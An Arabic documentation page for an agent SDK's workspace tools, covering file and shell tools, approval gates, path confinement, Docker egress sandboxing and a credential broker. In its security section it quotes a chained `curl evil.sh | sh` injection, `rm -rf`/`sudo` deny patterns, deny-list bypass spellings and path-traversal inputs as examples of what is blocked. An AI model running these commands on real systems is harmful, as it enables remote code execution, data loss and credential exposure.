@@ -1,0 +1,301 @@
+---
+title: "أدوات مساحة العمل"
+---
+{/* Generated from docs/workspace-tools.md in LinuxDevil/agent-sdk by scripts/sync-sdk-docs.mjs. Do not edit here. */}
+
+تمنح أدوات مساحة العمل الوكيلَ نظام ملفات وواجهة أوامر (shell)، فتستطيع بناء وكلاء برمجة على غرار Claude Code. لا تستخدم الأدوات `node:fs` ولا `node:child_process` مباشرة، بل تستدعي واجهتين صغيرتين هما `FsProvider` و`ShellProvider`، فتعمل الأدوات نفسها على مجلد محلي، أو على شجرة ملفات في الذاكرة أثناء الاختبارات، أو على حاوية Docker، أو على بيئة معزولة (sandbox) بعيدة مثل E2B أو Daytona أو Cloudflare.
+
+```ts
+import { AgentExecutor, ToolRegistry, NodeWorkspace, createFsTools, createShellTool } from '@lousho/build-ai-agent';
+
+const workspace = new NodeWorkspace({ root: '.' }); // every path is confined to this directory
+const registry = new ToolRegistry();
+registry.registerMany([...createFsTools(workspace), createShellTool(workspace)]);
+
+// The shell tool needs approval by default, so the run pauses before any command runs.
+const paused = await AgentExecutor.execute({ agent, input, provider, toolRegistry: registry, approvalStore });
+// paused.finishReason === 'awaiting-approval' -> resumeAfterApproval(...) once a human approves
+```
+
+الوكيل المنشأ بـ `createAgent()` يتوقف مؤقتًا بالطريقة نفسها: يعيد `send()` نتيجة فيها `finishReason: 'awaiting-approval'`، ثم ينفّذ `agent.approvals.resolve()` الأمر (أو يرفضه) ويتابع (راجع [الموافقات](/ar/approvals)). لتسمح بتنفيذ بعض الأوامر من دون سؤال، مرّر `needsApproval: false` مع قائمة `allow`، أو مرّر في `needsApproval` دالة شرطية تعيد `false` للأوامر التي تثق بها.
+
+```ts
+import { createAgent, NodeWorkspace, createFsTools, createShellTool } from '@lousho/build-ai-agent';
+
+const workspace = new NodeWorkspace({ root: './project' });
+const agent = createAgent({
+  instructions: 'You are a careful coding assistant. Run the tests after every change.',
+  provider,
+  tools: [
+    ...createFsTools(workspace),
+    createShellTool(workspace, { needsApproval: false, allow: ['npm test', 'npm run lint', 'git status', 'git diff'] }),
+  ],
+});
+const result = await agent.send('Fix the failing test in src/math.test.ts');
+```
+
+## الأدوات
+
+يعيد `createFsTools(fs, options?)` أدوات `defineTool` التالية:
+
+| الأداة       | المعاملات                                         | ما تعيده |
+| ------------ | ------------------------------------------------- | ------- |
+| `read_file`  | `path`، واختياريًا `offset` (رقم السطر بدءًا من 1) و`limit` | أسطر مرقّمة (`"    12\tcode"`). حين تُقتطَع المخرجات، يبيّن السطر الأخير الأسطر المعروضة وقيمة `offset` التي تتابع منها. تُرفَض الملفات التي يتجاوز حجمها 10 MB. |
+| `write_file` | `path`، `content`                                 | تنشئ الملف أو تكتب فوقه، وتنشئ المجلدات الأب المفقودة. |
+| `edit_file`  | `path`، `old_string`، `new_string`، واختياريًا `replace_all` | تستبدل النص المطابق تمامًا. تفشل برسالة يستطيع النموذج التصرف بناءً عليها حين لا يوجد `old_string` (وتتضمن تلميحًا عن نهايات الأسطر CRLF) أو حين يرد أكثر من مرة من دون `replace_all`. |
+| `list_dir`   | `path` اختياري                                    | مدخلات مرتّبة؛ وتنتهي أسماء المجلدات بـ `/`. |
+| `glob`       | `pattern`، واختياريًا `path`                      | مسارات الملفات المطابقة مرتّبة. تبقى `*` ضمن مجلد واحد، وتعبر `**` المجلدات، إضافة إلى `?` و`[abc]` و`{a,b}`. |
+| `grep`       | `pattern` (تعبير نمطي بصيغة JavaScript)، واختياريًا `path` و`glob` و`ignore_case` | `path:line: text` لكل سطر مطابق. التعبير النمطي غير الصالح خطأ أداة. تُتخطّى الملفات الثنائية والملفات التي يتجاوز حجمها 2 MB. |
+
+| الخيار            | القيمة الافتراضية           | المعنى |
+| ----------------- | --------------------------- | ------- |
+| `readOnly`        | `false`                     | تُنشأ `read_file` و`list_dir` و`glob` و`grep` فقط. |
+| `needsApproval`   | لا شيء                      | لكل أداة على حدة: `{ write_file: true, edit_file: ({ path }) => !path.startsWith('src/') }`. |
+| `maxReadLines`    | 2000                        | أقصى عدد أسطر تعيده `read_file` في الاستدعاء الواحد. |
+| `maxOutputChars`  | 50,000                      | أقصى عدد محارف تعيده الأداة في الاستدعاء الواحد. |
+| `maxResults`      | 200                         | أقصى عدد مسارات أو مطابقات أو مدخلات تعيده `glob` و`grep` و`list_dir`. |
+| `maxFilesScanned` | 20,000                      | أقصى عدد ملفات تزوره عملية مسح لـ `glob` أو `grep`. |
+| `ignore`          | `['.git', 'node_modules']`  | أسماء المجلدات التي تتخطاها `glob` و`grep`. |
+
+يعيد `createShellTool(shell, options?)` أداة واحدة هي `shell`، تأخذ `command` و`timeout_ms` اختياريًا، وتعيد `{ exitCode, stdout, stderr }`. حين يُقتَل الأمر، تتضمن النتيجة أيضًا `timedOut: true` أو `aborted: true` مع `note` تبيّن السبب.
+
+| الخيار             | القيمة الافتراضية | المعنى |
+| ------------------ | --------- | ------- |
+| `needsApproval`    | `true`    | `true` أو `false` أو دالة شرطية تُطبَّق على نص الأمر. |
+| `allow`            | لا شيء    | عند تعيينه، لا يُنفَّذ إلا الأوامر المطابقة. |
+| `deny`             | لا شيء    | تُرفَض الأوامر المطابقة. |
+| `defaultTimeoutMs` | 120,000   | المهلة حين لا يمرّر النموذج `timeout_ms`. |
+| `maxTimeoutMs`     | 600,000   | تُخفَّض أي قيمة `timeout_ms` أكبر إلى هذه القيمة. |
+| `maxOutputChars`   | 30,000    | لكل مجرى على حدة. بعد هذا الحد يُحتفَظ ببداية المخرجات ونهايتها ويُستبدَل الوسط بعلامة. |
+| `cwd`، `env`       | لا شيء    | مجلد العمل (نسبةً إلى مساحة العمل) ومتغيرات إضافية لكل أمر. |
+| `name`             | `'shell'` | اسم الأداة. |
+
+```ts
+import { createShellTool, NodeWorkspace } from '@lousho/build-ai-agent';
+
+const shell = createShellTool(new NodeWorkspace({ root: '.' }), {
+  needsApproval: (command) => !/^(ls|cat|git (status|diff|log))\b/.test(command), // read-only commands run without asking
+  deny: ['rm -rf', /\bsudo\b/],
+  defaultTimeoutMs: 60_000,
+});
+```
+
+إلغاء التشغيل (`agent.send(input, { signal })` أو `AgentExecutor.execute({ signal })`) يقتل الأمر الجاري مع كل العمليات التي بدأها: مجموعة العمليات في Linux وmacOS، و`taskkill /T` في Windows.
+
+## نموذج الأمان
+
+اقرأ هذا القسم قبل أن تمنح نموذجًا واجهة أوامر.
+
+### ما يُفرَض فعلًا
+
+**المسارات تبقى داخل الجذر.** قبل المساس بأي ملف، يوحّد `NodeWorkspace` (وكذلك `MemoryWorkspace`) صيغة كل مسار. وتُرفَض الحالات التالية على كل المنصات:
+
+- `..` التي تصعد فوق الجذر (`../secret` و`src/../../secret`)
+- المسارات المطلقة (`/etc/passwd`، وكذلك المسار المطلق الذي يشير إلى داخل الجذر)
+- حروف الأقراص في Windows (`C:\Windows` و`C:secret`)
+- مسارات UNC والمسارات ذات الطول الممتد (`\\server\share` و`//server/share` و`\\?\C:\`)
+- بايتات NUL
+
+تُعَدّ الشرطات المائلة العكسية فواصل في كل مكان، فلا يمكن لخلط الفواصل (`src/..\..\secret`) أن يخفي `..`. وفي Windows تُرفَض أيضًا `:` (مجاري البيانات البديلة)، وأسماء الأجهزة المحجوزة (`CON` و`NUL` و`COM1` وغيرها)، والمقاطع المؤلفة من نقاط ومسافات فقط (يحذف Windows النقاط والمسافات في نهاية الاسم، فكانت `.. ` ستعمل عمل `..`).
+
+**الروابط الرمزية لا تستطيع الخروج.** بعد ذلك الفحص، يحلّ `NodeWorkspace` المسار باستخدام `realpath`. وإن لم يكن المسار موجودًا بعد، حلّ أعمق جزء موجود منه. ويجب أن تبقى النتيجة داخل المسار الحقيقي للجذر نفسه. وهذا يعني:
+
+- الرابط الموجود داخل الجذر ويشير إلى خارجه يُرفَض عند القراءة، وعند الكتابة إلى ملفات غير موجودة بعد (`escape-link/new.txt`).
+- الرابط الذي لا وجود لهدفه لا يُتبَع أبدًا، لأن الكتابة عبره قد تنشئ ملفًا خارج الجذر.
+- لا تتبع `glob` و`grep` الروابط أبدًا أثناء المرور على شجرة الملفات.
+- تنفيذ `rm` على رابط يحذف الرابط نفسه ويترك هدفه كما هو.
+
+**حالات الرفض أخطاء أدوات.** المسار المرفوض، أو الملف المفقود، أو التعديل الملتبس يرمي `WorkspaceError` داخل الأداة. يتلقى النموذج `{ "error": "WorkspaceError", "toolName": "read_file", "message": "..." }` ويستمر التشغيل. تعرض الرسائل مسار مساحة العمل، لا مسار المضيف أبدًا.
+
+**الأوامر تحصل على بيئة محدودة.** ينفّذ `NodeWorkspace` الأوامر مع ضبط `cwd` على الجذر، ولا يمرّر إليها متغيرات بيئة العملية الأب. لا يُنسَخ سوى `PATH` و`HOME` و`USERPROFILE` و`TEMP` و`TMP` و`TMPDIR` و`LANG` و`LC_*` و`TERM`، إضافة إلى `SystemRoot` و`SystemDrive` و`ComSpec` و`PATHEXT` و`WINDIR` في Windows، لأن واجهة الأوامر تحتاج إليها لتبدأ. وعليه فإن `OPENAI_API_KEY` و`ANTHROPIC_API_KEY` وبيانات اعتماد الخدمات السحابية وغيرها من الأسرار في بيئة خادمك غير مرئية للأوامر التي يكتبها النموذج، ولا يستطيع `env` أو `printenv` كشفها. لتعطي الأوامر أكثر من ذلك، مرّر قيمًا (`env: { GITHUB_TOKEN: scopedToken }`) أو سمِّ متغيرات من المضيف لتُنسَخ (`inheritEnv: ['CI']`). وكل ما تمرّره بهذه الطريقة مرئي للنموذج. يمرّر `inheritEnv: true` بيئة المضيف كاملة، كما كان الحال قبل وجود هذا السلوك الافتراضي؛ فلا تستخدمه إلا مع أوامر تثق بها. وفي Windows يضيف مشغّل العمليات في Node أيضًا متغيرات الجلسة التي تحتاج إليها كل عملية (`HOMEDRIVE` و`HOMEPATH` و`USERNAME` و`USERDOMAIN` و`LOGONSERVER`)؛ وليس أيٌّ منها سرًّا.
+
+```ts
+import { NodeWorkspace } from '@lousho/build-ai-agent';
+
+const workspace = new NodeWorkspace({
+  root: './project',
+  env: { NODE_ENV: 'test' },        // added for every command
+  inheritEnv: ['CI', 'NODE_OPTIONS'], // copied from the host environment
+});
+```
+
+**أداة واجهة الأوامر تحتاج إلى موافقة افتراضيًا.** ما لم تختر غير ذلك، ينتظر كل أمر موافقة إنسان. تُفحَص `allow` و`deny` أولًا، فالأمر المرفوض لا يُعرَض للموافقة أصلًا:
+
+- النمط النصي يطابق الأمر الذي يساوي النمط تمامًا، أو الذي يبدأ به متبوعًا بمسافة (`'git status'` يطابق `git status -s`).
+- في `allow`، الأمر الذي لا يطابقه سوى نمط نصي يجب ألا يحتوي على عوامل واجهة الأوامر (`;` `&` `|` `` ` `` `$(` `<` `>` أو سطر جديد). هذا يمنع `git status; curl evil.sh | sh` من المرور على أنه `git status`.
+- يُختبَر التعبير النمطي (RegExp) على سطر الأمر كله، فثبّت طرفيه: `/^npm (test|run lint)$/`.
+- تُفحَص الأنماط النصية في `deny` مقابل كل جزء من الأمر تفصله `;` أو `&` أو `|`.
+
+### ما لا يُفرَض
+
+- **واجهة الأوامر في `NodeWorkspace` ليست بيئة معزولة.** حصر المسارات يسري على أدوات الملفات فقط. الأمر يعمل بحساب مستخدم نظام التشغيل الذي تعمل به، ويستطيع قراءة أي شيء يستطيعه ذلك المستخدم أو كتابته أو حذفه، ومن ذلك `../` و`~/.ssh`، ويستطيع استخدام الشبكة. الموافقة وقوائم `allow` تقلّل الخطر، لكنها ليست عزلًا. مع المدخلات غير الموثوقة، كالموجّهات الواردة من الجمهور أو المحتوى المجلوب من الويب، أعطِ أداة واجهة الأوامر `ShellProvider` يستند إلى بيئة معزولة (انظر أدناه)، واستخدم أدوات الملفات مع `readOnly: true` أو مع الموافقة.
+- **قائمة المنع وسيلة تيسير لا أكثر.** في واجهة الأوامر طرق كثيرة لكتابة الأمر نفسه (`r''m -rf`، `$(echo rm)`، مسافة زائدة، ملف سكربت)، فلا تعتمد على `deny` للأمان. استخدم `allow` لهذا الغرض.
+- **حالات التسابق والروابط الصلبة.** تُفحَص المسارات ثم تُستخدَم. والعملية التي تستبدل مجلدًا برابط رمزي بين هاتين الخطوتين تستطيع الالتفاف على الفحص. لكن عملية كهذه تملك وصولًا محليًا أصلًا، كأمر نفّذته أداة واجهة الأوامر من دون بيئة معزولة. ولا يمكن اكتشاف رابط صلب داخل الجذر يشير إلى ملف خارجه.
+- **`grep` تنفّذ التعبير النمطي الذي يكتبه النموذج داخل عمليتك.** قد يكون نمط خبيث البنية بطيئًا. عدد الأسطر والملفات محدود، لكن محرك التعابير النمطية نفسه غير مقيَّد بزمن.
+
+### واجهة أوامر معزولة: `SandboxShell`
+
+يكيّف `SandboxShell` أي `SandboxAdapter`، مثل `SubprocessSandbox` المستند إلى Docker، ليصبح `ShellProvider`. يُنفَّذ كل أمر بالصيغة `sh -c "<command>"` في حاوية جديدة بلا شبكة. لا ترى الحاوية سوى `cwd`، وهو مربوط (bind mount) على المسار نفسه. ولا تحصل إلا على `env` الذي تمرّره، ولا شيء من المضيف. ويمكن لأدوات الملفات أن تواصل استخدام `NodeWorkspace` على المجلد نفسه:
+
+```ts
+import { createFsTools, createShellTool, NodeWorkspace, SandboxShell, SubprocessSandbox } from '@lousho/build-ai-agent';
+
+const workspace = new NodeWorkspace({ root: './project' });
+const shell = new SandboxShell(new SubprocessSandbox({ image: 'node:20-alpine' }), { cwd: workspace.root });
+const tools = [...createFsTools(workspace), createShellTool(shell, { needsApproval: false })];
+```
+
+**البيئة والشبكة.** يقبل `SandboxShell` خياري `env` و`inheritEnv` نفسيهما اللذين يقبلهما `NodeWorkspace`. الحاوية لا تحصل إلا على تلك المتغيرات: لا تحصل على بيئة المضيف أبدًا، ولا على `PATH` أو `HOME` الخاصين بالمضيف، لأن الصورة تأتي بقيمها الخاصة. مع `NoopSandbox` (الذي يعمل على المضيف) يحصل الأمر على الأساس الصغير نفسه الذي يستخدمه `NodeWorkspace`، إضافة إلى متغيراتك؛ ويعيد `inheritEnv: true` هناك بيئة المضيف كاملة، لكن الحاوية لا تتلقاها أبدًا مع ذلك.
+
+يقبل `SubprocessSandbox` سياسة `network`:
+
+| `network` | ما تحصل عليه الحاوية |
+|---|---|
+| `'none'` (القيمة الافتراضية) | لا شبكة إطلاقًا (`NetworkMode: 'none'` في Docker). |
+| `'default'` | شبكة Docker الافتراضية: اتصال صادر غير مقيَّد. |
+| `{ allow: ['api.github.com', '*.npmjs.org'] }` مع `broker` | هذه المضيفات فقط، عبر [وسيط بيانات الاعتماد](#وسيط-بيانات-الاعتماد). انظر أدناه. |
+| `{ allow: [...] }` من دون `broker` | لا شبكة (إغلاق عند الفشل). |
+
+تُفحَص أسماء المضيفات عند إنشاء البيئة المعزولة، فعنوان URL أو الاسم غير السليم يرمي خطأ؛ وتُحفَظ القائمة بعد التحقق منها في `sandbox.network`.
+
+#### الاتصال الصادر بقائمة سماح: `network: { allow }` مع وسيط
+
+لا يستطيع Docker بمفرده ترشيح حركة البيانات الصادرة بحسب اسم المضيف، لذا لا تُفرَض قائمة `allow` إلا حين يكون البروكسي (proxy) المنفذ الوحيد للحاوية إلى الخارج. يبني `SubprocessSandbox` ذلك بالعناصر الأساسية في Docker نفسه:
+
+1. عند أول استدعاء لـ `run()` ينشئ شبكة جسرية **داخلية** (`Internal: true`، بلا IPv6، وبالوسم `com.lousho.sandbox=egress`) اسمها `networkName` أو `lousho-egress-<random>`. الشبكة الداخلية لا مسار فيها إلى خارج الجسر. وإن وُجدت شبكة بذلك الاسم أُعيد استخدامها، بشرط أن تكون داخلية.
+2. يحصل الوسيط على مستمع ثانٍ على عنوان بوابة تلك الشبكة، وهو في Docker Engine على Linux واجهة المضيف نفسه على الجسر. لا يقبل المستمع اتصالات إلا من الشبكة الفرعية لتلك الشبكة (أي طرف آخر يُقطَع اتصاله قبل قراءة أي بايت)، فهو ليس بروكسي مفتوحًا على واجهات المضيف الأخرى. قائمة السماح الخاصة به هي مضيفات قواعد الوسيط مضافًا إليها قائمة `allow` الخاصة بالبيئة المعزولة. أما خيار `allow` الخاص بالوسيط ومستمعه على العنوان المحلي (loopback) فلا يتغيران.
+3. تنضم كل حاوية إلى تلك الشبكة مع ضبط `HTTP_PROXY`/`HTTPS_PROXY` (وصيغتيهما بالأحرف الصغيرة) على مستمع البوابة، مدموجةً فوق `env` الذي تمرّره. لا يحمل `NO_PROXY` سوى عنوان البوابة، فيصل `$HTTP_PROXY/__broker/<host>/<path>` (صيغة المسار التي تضيف بيانات الاعتماد) إلى الوسيط مباشرة؛ ولا يتيح ذلك أي تجاوز آخر، لأنه لا شيء آخر يمكن الوصول إليه.
+4. يوقف `sandbox.close()` المستمع ويحذف الشبكة إن كانت هذه البيئة المعزولة هي التي أنشأتها. التشغيل الملغى أو المنتهية مهلته يحذف حاويته كما في السابق؛ وتبقى الشبكة للتشغيل التالي للبيئة المعزولة إلى أن يُستدعى `close()`.
+
+```ts
+import { createCredentialBroker, createShellTool, SandboxShell, SubprocessSandbox } from '@lousho/build-ai-agent';
+
+const token = 'ghp_example'; // read from your secret store; it never enters the container
+const broker = await createCredentialBroker({ rules: { 'api.github.com': { authorization: () => `Bearer ${token}` } } });
+const sandbox = new SubprocessSandbox({ image: 'node:20-alpine', network: { allow: ['registry.npmjs.org'] }, broker });
+const tool = createShellTool(new SandboxShell(sandbox, { cwd: '/abs/path/to/project' }), { needsApproval: false });
+// ... run the agent with `tool` ...
+await sandbox.close();
+await broker.close();
+```
+
+ما الذي يفرضه هذا، وأين:
+
+- **Docker Engine على Linux والوكيل على المضيف نفسه: مفروض.** تستطيع الحاوية الوصول إلى عنوان البوابة ولا شيء بعد الجسر. أما DNS: فالحاوية لا تحلّ أي أسماء خارجية بنفسها (Engine 25.0.5 وما بعده لا يعيد توجيه DNS من الشبكات الداخلية، CVE-2024-29018؛ والإصدارات الأقدم من Engine تُرفَض)، فتذهب الأسماء إلى البروكسي الذي يحلّها على المضيف بعد فحص قائمة السماح. الاتصالات المباشرة بعناوين IP لا مسار لها. البروتوكولات غير HTTP (SSH، و TCP الخام، و UDP) محجوبة، لأن البروكسي وحده يمكن الوصول إليه، وتُفحَص أنفاق `CONNECT` مقابل قائمة السماح كأي طلب.
+- **Docker Desktop (Windows وmacOS، و Desktop على Linux): مرفوض.** الحاويات تعمل داخل آلة افتراضية، فلا يملك المضيف عنوانًا على الشبكة الداخلية. و`host.docker.internal` لا يصل إلى المضيف إلا من الشبكات غير الداخلية، وهذه تصل إلى كل شيء آخر أيضًا. يرفض `run()` بالخطأ [`LOUSHO_SANDBOX_EGRESS_UNSUPPORTED`](/ar/errors#lousho_sandbox_egress_unsupported) ولا يشغّل أي حاوية. وكذلك الحال مع Docker بلا صلاحيات الجذر (rootless) (الجسر يقع في فضاء أسماء شبكة خاص به)، ومع خدمة Docker (daemon) على جهاز آخر (لا يستطيع الوسيط الارتباط بعنوان البوابة)، ومع شبكة مُعاد استخدامها وليست داخلية، ومع إصدار من Engine أقدم من 25.0.5.
+- **خدمات أخرى على عنوان الجسر في المضيف.** الحاوية الموجودة على شبكة داخلية تستطيع الوصول إلى أي خدمة على المضيف تستمع على عنوان البوابة أو على كل العناوين (`0.0.0.0`). اربط خدمات المضيف بـ `127.0.0.1`، أو قيّد بجدار ناري الشبكة الفرعية للجسر لتصل إلى منفذ الوسيط فقط. وجدار المضيف الناري الذي يُسقط حركة البيانات القادمة من الجسر (سياسة `INPUT` صارمة) يحجب الوسيط أيضًا: عندئذ تفشل التشغيلات في الاتصال، ولا تحصل على اتصال صادر مفتوح.
+- **أوامر المضيف ما زالت غير محمية بجدار ناري.** أمر ينفّذه `NodeWorkspace` أو `NoopSandbox` يستطيع تجاهل متغيرات البروكسي؛ راجع ملاحظات وسيط بيانات الاعتماد أدناه.
+
+هذه الضمانات مستمدة من سلوك الشبكات الداخلية الموثَّق في Docker؛ واختبارات حزمة SDK تتحقق من هذا الربط مقابل عميل Docker زائف، لا مقابل خدمة Docker حية.
+
+```ts
+import { createShellTool, SandboxShell, SubprocessSandbox } from '@lousho/build-ai-agent';
+
+const sandbox = new SubprocessSandbox({ image: 'node:20-alpine', network: 'none' });
+const shell = new SandboxShell(sandbox, {
+  cwd: '/abs/path/to/project',
+  env: { NODE_ENV: 'test' }, // set for every command
+  inheritEnv: ['CI'],        // copied from the host environment
+});
+const tool = createShellTool(shell, { needsApproval: false });
+```
+
+ما لا يغطيه هذا: القيمة التي تمرّرها في `env` أو `inheritEnv` تستطيع أوامر النموذج قراءتها، و`network: 'default'` يتيح للأمر إرسالها إلى أي مكان. أبقِ الأسرار طويلة الأمد خارجهما؛ واستخدم بدلًا من ذلك وسيط بيانات الاعتماد أدناه.
+
+عند إلغاء التشغيل، يمرّر `SandboxShell` إشارة الإلغاء إلى المهايئ. عندئذ يقتل `SubprocessSandbox` الحاوية ويحذفها، وتبلّغ أداة واجهة الأوامر بـ `aborted: true`؛ والإشارة الملغاة مسبقًا لا تشغّل أي حاوية. المهايئ الذي يتجاهل `SandboxRunOptions.signal` لا يُنتظَر بعد الآن، لكن أمره يظل يعمل حتى انتهاء مهلته؛ وأداة واجهة الأوامر تعيّن مهلة دائمًا.
+
+### وسيط بيانات الاعتماد
+
+أمر ينفّذه النموذج (`git` أو `curl` أو سكربت) يحتاج أحيانًا إلى استدعاء واجهة API تتطلب مصادقة، لكن أي رمز وصول (token) في بيئته يستطيع النموذج قراءته. يُبقي `createCredentialBroker()` الرمز على المضيف: يشغّل بروكسي HTTP محليًا يضيف ترويسات المصادقة إلى الطلبات الموجَّهة إلى المضيفات التي تسمّيها، فلا يرى الأمر سوى عنوان البروكسي.
+
+```ts
+import { createCredentialBroker, NodeWorkspace } from '@lousho/build-ai-agent';
+
+const token = 'ghp_example'; // read from your secret store; never passed to the command
+const broker = await createCredentialBroker({
+  rules: { 'api.github.com': { authorization: () => `Bearer ${token}` } },
+  allow: ['registry.npmjs.org'], // reachable without injected headers
+});
+const workspace = new NodeWorkspace({ root: './project', env: { ...broker.env } });
+await workspace.exec(`curl -s ${broker.baseUrl('api.github.com')}/user`);
+await broker.close();
+```
+
+- **ما يعيده.** `url` (البروكسي، على منفذ مؤقت على `127.0.0.1` افتراضيًا)، و`env` (`HTTP_PROXY` و`HTTPS_PROXY` و`NO_PROXY` وصيغها بالأحرف الصغيرة، لتُمرَّر إلى خيار `env` في `NodeWorkspace` أو `SandboxShell`)، و`baseUrl(host)`، و`close()` الذي يوقف المستمع ويغلق المقابس المفتوحة. قيمة الترويسة سلسلة نصية أو دالة تُستدعى مع كل طلب.
+- **قائمة السماح.** مضيفات القواعد (أسماء مطابقة تمامًا أو `*.suffix`) مسموح بها ضمنيًا؛ ويضيف `allow` مضيفات يمكن الوصول إليها من دون ترويسات محقونة. أي مضيف آخر يتلقى 403 قبل فتح أي اتصال. المضيفات التي تؤول إلى عناوين محلية (loopback) أو عناوين link-local (مثل عنوان البيانات الوصفية السحابية `169.254.169.254`) أو عناوين خاصة تُرفَض ما لم تُدرَج في `allowPrivate`، فلا يستطيع أمر استخدام البروكسي للوصول إلى خدمات على جهازك أو شبكتك.
+- **الأسرار تبقى على المضيف.** القيم المحقونة لا تظهر أبدًا في `env`، ولا في استجابات الخطأ من البروكسي، ولا في أي سجل. الطلب الموجَّه إلى مضيف يخدمه الوسيط ويحمل مسبقًا ترويسة `Authorization` تُحذَف ترويسته وتُستبدَل. الترويسات الخاصة بكل قفزة (`Connection` و`Proxy-Authorization` وغيرها) لا تُعاد توجيهها.
+- **قيد HTTPS.** حقن الترويسات يعمل مع طلبات HTTP غير المشفّرة ومع صيغة المسار: يخدم الوسيط `http://127.0.0.1:<port>/__broker/<host>/<path>` ويعيد توجيهه إلى `https://<host>/<path>` مع إضافة الترويسات، وهذا ما يعيده `baseUrl(host)`. وجّه أي أداة إلى عنوان URL الأساسي هذا (مثل خيار `baseURL` في حزمة SDK ما، أو عنوان URL لأمر `curl`) لتحصل على المصادقة من دون أن تحمل الرمز. أما العميل الذي يستخدم `HTTPS_PROXY` مع عنوان `https://` فيفتح نفق `CONNECT`: يفحص الوسيط قائمة السماح على هدف النفق ويمرّر البايتات المشفّرة كما هي، فلا تُضاف أي ترويسة. الوسيط لا يعترض TLS.
+- **ليس جدارًا ناريًا على المضيف.** أمر ينفّذه `NodeWorkspace` يستطيع تجاهل متغيرات البروكسي وفتح اتصالاته الخاصة؛ فقائمة السماح لا تغطي إلا حركة البيانات المرسلة عبر الوسيط. ما يضمنه الوسيط هو أن الرمز لا يكون أبدًا في متناول الأمر.
+- **الحاويات.** لا تمرّر `broker.env` إلى `SubprocessSandbox`: فهو يشير إلى العنوان المحلي (loopback) للمضيف. مرّر الوسيط نفسه بدلًا من ذلك، `new SubprocessSandbox({ network: { allow }, broker })`، فتوجّه البيئة المعزولة حاوياتها عبره (راجع [الاتصال الصادر بقائمة سماح](#الاتصال-الصادر-بقائمة-سماح-network--allow--مع-وسيط)). وتفعل ذلك باستخدام `broker.listen({ host, clients, allow })`، الذي يضيف مستمعًا على عنوان آخر لا يخدم إلا الأطراف القادمة من الشبكة الفرعية `clients`، وقائمة السماح الخاصة به هي مضيفات القواعد مضافًا إليها `allow`. الوسيط لا يستمع إلا على العنوان المحلي ما لم تستدعِ هذه الدالة.
+
+## كتابة مزوّدك الخاص
+
+الواجهتان صغيرتان. المسارات نسبية إلى مساحة العمل وتستخدم `/`. تطبّق `normalizeWorkspacePath()` الفحوص نفسها التي تستخدمها المزوّدات المدمجة. المزوّد المتاح لنموذج يجب أن يحصر المسارات بنفسه، لأن أداة مخصصة قد تستدعيه مباشرة. عند الفشل ارمِ `WorkspaceError` برسالة مفهومة.
+
+```ts
+import { normalizeWorkspacePath, WorkspaceError, type FsProvider, type ShellProvider } from '@lousho/build-ai-agent';
+
+// A stand-in for your remote sandbox SDK (E2B, Daytona, Cloudflare, ...).
+declare const remote: {
+  read(path: string): Promise<string | null>;
+  write(path: string, data: string): Promise<void>;
+  list(path: string): Promise<{ name: string; dir: boolean }[]>;
+  run(cmd: string, opts: { cwd: string; timeoutMs?: number }): Promise<{ out: string; err: string; code: number }>;
+};
+const base = '/home/user/project';
+const abs = (path: string) => `${base}/${normalizeWorkspacePath(path, 'posix')}`;
+
+export const remoteFs: FsProvider = {
+  async readFile(path) {
+    const data = await remote.read(abs(path));
+    if (data === null) throw new WorkspaceError(`File not found: ${path}`);
+    return data;
+  },
+  writeFile: (path, content) => remote.write(abs(path), content),
+  async stat(path) {
+    const data = await remote.read(abs(path));
+    return data === null ? undefined : { type: 'file', size: data.length };
+  },
+  async readdir(path) {
+    return (await remote.list(abs(path))).map((e) => ({ name: e.name, type: e.dir ? 'directory' : 'file' }));
+  },
+  async mkdir(path) { await remote.run(`mkdir -p '${abs(path)}'`, { cwd: base }); },
+  async rm(path, options) { await remote.run(`rm ${options?.recursive ? '-r ' : ''}'${abs(path)}'`, { cwd: base }); },
+};
+
+export const remoteShell: ShellProvider = {
+  async exec(command, options = {}) {
+    const r = await remote.run(command, { cwd: abs(options.cwd ?? '.'), timeoutMs: options.timeoutMs });
+    return { stdout: r.out, stderr: r.err, exitCode: r.code, timedOut: false };
+  },
+};
+```
+
+ينبغي أن يُتمّ `ShellProvider.exec` وعده بنتيجة، لا أن يرفضه، عند رمز خروج غير صفري، أو انتهاء المهلة (`timedOut: true`)، أو الإلغاء (`aborted: true`). ولا ينبغي أن يرفض إلا حين يتعذّر بدء الأمر.
+
+## الاختبار باستخدام `MemoryWorkspace`
+
+يحفظ `MemoryWorkspace` شجرة الملفات في الذاكرة ويفحص المسارات بالطريقة نفسها. الدالة `exec` فيه بديل شكلي تبرمجه أنت، ويُسجَّل كل أمر يتلقاه. اجمعه مع `mockModel` لتحصل على اختبارات حتمية:
+
+```ts
+import { createAgent, createFsTools, createShellTool, MemoryWorkspace } from '@lousho/build-ai-agent';
+import { mockModel } from '@lousho/build-ai-agent/testing';
+
+const workspace = new MemoryWorkspace({
+  files: { 'src/math.ts': 'export const add = (a: number, b: number) => a - b;\n' },
+  exec: (command) => (command === 'npm test' ? { stdout: '1 passed\n' } : { exitCode: 1, stderr: 'unknown command\n' }),
+});
+const provider = mockModel([
+  { toolCalls: [{ name: 'edit_file', args: { path: 'src/math.ts', old_string: 'a - b', new_string: 'a + b' } }] },
+  { toolCalls: [{ name: 'shell', args: { command: 'npm test' } }] },
+  'Fixed add() and the tests pass.',
+]);
+const agent = createAgent({
+  instructions: 'Fix bugs.',
+  provider,
+  tools: [...createFsTools(workspace), createShellTool(workspace, { needsApproval: false })],
+});
+await agent.send('add() is broken');
+console.log(workspace.snapshot()['src/math.ts']); // '... a + b;\n'
+console.log(workspace.commands.map((c) => c.command)); // ['npm test']
+```
